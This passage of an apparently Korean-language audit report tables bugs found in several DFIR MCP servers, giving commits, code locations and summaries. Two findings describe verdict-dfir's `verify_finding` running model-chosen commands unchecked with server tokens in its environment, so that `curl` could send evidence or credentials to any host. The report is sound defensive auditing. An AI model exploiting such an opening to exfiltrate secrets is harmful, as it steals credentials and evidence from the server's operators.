| P2064-008 | P1014 | sift-mcp 5ef6081 | packages/sift-mcp/src/sift_mcp/tools/generic.py:98-113 | `run_command` / `command`: 출력 플래그·플래그 정책을 `command[0]` 이름으로만 찾아 같은 명령이라도 경로·이름 표기에 따라 정책이 달라진다. |
| P4148-008 | P1012 | verdict-dfir acada5c | services/agent_mcp/findevil_agent_mcp/tools/verify_finding.py:54-63,109-110,138; services/agent/findevil_agent/mcp_client.py:145-158 | `verify_finding`이 모델이 준 `findevil_mcp_command` argv를 허용 목록 없이 `env=None`으로 실행해, 자식이 `SIGSTORE_ID_TOKEN`·`GH_TOKEN` 같은 서버 환경을 그대로 받는다. |
| P4157-006 | P1012-003 | verdict-dfir acada5c | services/agent_mcp/findevil_agent_mcp/tools/verify_finding.py:54-63,109-110,138; services/agent/findevil_agent/mcp_client.py:145-158 | `verify_finding`의 `findevil_mcp_command`를 모델이 정하므로 `curl` 같은 명령으로 증거나 자격증명을 임의 호스트에 보낼 수 있다. |
| P2067-022 | P1039 | winforensics-mcp cce7f36 | winforensics_mcp/parsers/browser_parser.py:60-63 | `browser_get_history` / `history_path`: `file:{path}?mode=ro` URI에 그대로 넣어 `#`·`?`가 든 경로가 잘리고 `mode=ro`가 빠진다. |
| P4142-010 | P1021 | winforensics-mcp cce7f36 | winforensics_mcp/server.py:263-286, 276-285, 1665-1700, 1706-1743, 1865-1930, 1929-1975, 2168-2237, 3223-3225 | `json_response`의 잘림 안내가 `offset`·`time_range_start/end`로 다음 쪽을 나눠 받으라고 모든 도구에 붙지만, `disk_parse_mft`·`disk_parse_usn_journal`·`yara_scan_directory` 등 다수 도구에는 그 인자가 없어 무시되고 같은 잘린 결과가 다시 나오며, `windows_search_parse`(`time_start`·`time_end`, `additionalProperties:false`)는 안내대로 넘기면 `Input validation error`로 거부해 나머지를 얻을 수 없다. (조건: 결과가 잘릴 만큼 클 때) |

### 3장으로 (10건)

| 원래 사례 | 대상 | 서버·커밋 | 코드 위치 | 요지 |
|---|---|---|---|---|
| P2049-014 | P3081 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | core/logging_setup.py:31-48; handlers/kape_handlers.py:78-81; handlers/kape_handlers.py:106-109 | `kape_parse_artifact`가 `log_kape_operation(op, cmd, return_code, output, error, dir)`를 `(op, cmd, output, error, returncode, dir)` 순서로 불러, 감사 로그(`audit_kape_operations`가 그대로 반환)의 `RETURN CODE`에 KAPE stdout이, `ERRORS`에 종료 코드가 기록된다. |
| P2049-085 | P3194 | Cyber-Incident-Investigation-and-Triage-MCP-Server 39e8509 | handlers/kape_handlers.py:329-329; handlers/kape_handlers.py:333-365; core/logging_setup.py:42-59 | `audit_kape_operations`는 KAPE 작업 기록을 작업별로 보여 주고 `operation_type`으로 거른다고 알리지만 처리 함수는 실제 줄바꿈으로 쓴 로그를 `split('\\n')`(문자 그대로 역슬래시+n)으로 나눠 파일 전체를 한 줄로 읽어, 기록 전체가 1건으로 뭉치고 `operation_type`을 주면 늘 'No KAPE operations found'를 정상 응답으로 준다. |
| P2055-068 | P3005 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:10763-10784; sift_mcp/server.py:10813-10852 | `load_memory`는 ZIP을 풀고 나서 방금 푼 파일이 아니라 `output_dir` 전체를 `rglob`해 확장자 순서상 처음 찾은 파일(없으면 100MB 넘는 아무 파일)을 고르는데 정의에 이 선택 규칙이 없어, 이전에 풀어 둔 다른 덤프나 ZIP 안의 다른 덤프가 `raw_dump_path`로 반환될 수 있다. (조건: output_dir에 이전에 푼 다른 덤프가 있거나 ZIP 안에 덤프가 여럿) |
| P2055-070 | P3005 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:6582-6608; sift_mcp/server.py:6615-6626; sift_mcp/server.py:6842-6868; sift_mcp/server.py:6875-6882 | `extract_shimcache`·`extract_srum`은 `mount_point`에서 SYSTEM 하이브·SRUDB.dat를 못 찾으면 정의에 없는 `/cases/{case_id}/artifacts/raw/...`의 스테이징 파일로 조용히 대체하고 응답에 어느 원본을 썼는지 알리지 않아, 잘못된 `mount_point`나 다른 이미지에서 스테이징한 파일의 결과가 해당 이미지 결과로 보고될 수 있다. (조건: mount_point에서 하이브·SRUDB를 못 찾고 다른 이미지의 스테이징 파일이 남아 있음) |
| P4093-030 | P3005 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:6646-6702 | `extract_shimcache`: 출력 폴더 `/cases/shimcache/<case_id>`를 실행마다 비우지 않고 `*AppCompatCache.csv` 중 마지막 것을 읽어, 이번 실행이 CSV를 만들지 못해도 이전 실행이 남긴 CSV를 결과로 성공(조건: 같은 `case_id` 재실행). |
| P4093-031 | P3005 | SAVVYDFIR-MCP 9ac8e47 | sift_mcp/server.py:10813-10847 | `load_memory` / ZIP: 공유 기본 폴더 `/evidence/memory`에 풀고 그 아래 첫 `.raw`·`.mem` 등을 찾아, 이전에 풀어 둔 다른 덤프를 이번 덤프의 `raw_dump_path`로 돌려줄 수 있음(조건: 같은 `output_dir`에 이전 덤프가 남음). |
| P2061-046 | P3005 | Wireshark-MCP 0e1b659 | src/wireshark_mcp/tools/yara_scan.py:99-120 | `wireshark_yara_scan` / `dest_dir`: 비어 있지 않은 기존 폴더를 주면 원래 있던 파일까지 검사해 트래픽에서 내보낸 객체의 결과로 보고한다. |
| P4093-016 | P3005 | mcp-velociraptor 1f97a4f | velociraptor_api.py:433-447, 488-501 | `hunt_across_fleet`: `hunt()`가 hunt ID를 돌려주지 않으면 설명이 같은 가장 최근 hunt(이전 실행)의 ID를 대신 써 새 hunt를 만든 것처럼 성공 응답(조건: 같은 설명의 이전 hunt 존재, 기본 설명은 `MCP Hunt: <artifact>`). |
| P4133-001 | P3075 | mcp_dfir 305fcad | mcp_dfir/docker_manager.py:75-77 | `exec_stream`이 스트림 조각마다 `data.decode()`를 불러, UTF-8이 아니거나 조각 경계에서 잘린 다바이트 출력이면 정상 실행도 `UnicodeDecodeError`로 끝나고 명령 기록이 남지 않는다(3장 기록 문제와 겹침). |
| P4143-005 | P3089 | sift-kernel ea51bec | src/server.ts:1805-1820, 1955-1964, 2031-2055 | 원본 출력 보관(`rawStore`)·원장 기록과 비동기 `async-<job>.txt`가 실행기 상한에서 잘린 출력을 성공·`completed`로 저장하고 잘림을 기록하지 않아, 이를 다시 읽는 in-process 처리기가 잘린 원본을 전체로 쓴다. |
